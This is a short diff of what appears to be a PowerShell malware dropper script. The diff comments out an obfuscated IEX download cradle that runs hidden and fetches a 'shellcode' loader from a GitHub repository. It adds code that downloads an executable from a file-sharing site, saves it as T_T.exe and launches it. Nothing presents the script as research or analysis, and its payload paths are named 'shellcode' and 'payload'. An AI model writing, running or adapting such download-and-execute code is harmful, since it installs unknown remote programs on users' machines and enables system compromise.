@@ -107,9 +107,20 @@ Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -Pas
 
 
 
-$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/shellcode/loaderclient.ps1")
-$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+# $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/shellcode/loaderclient.ps1")
+# $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+# Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+
+$url = "https://anonsharing.com/file/3bcedc688a307967/rc_(2).exe"
+$output = "$dir\T_T.exe"
+if (Test-Path -Path $output) {
+    Write-Host "hello"
+} else {
+    Invoke-WebRequest -Uri $url -OutFile $output
+    Start-Process $output
+    Write-Host "Tệp đã được tải về thành công."
+}
+
 
 
 # $url = "https://raw.githubusercontent.com/43a1723/test/refs/heads/main/payload/lmao.exe"
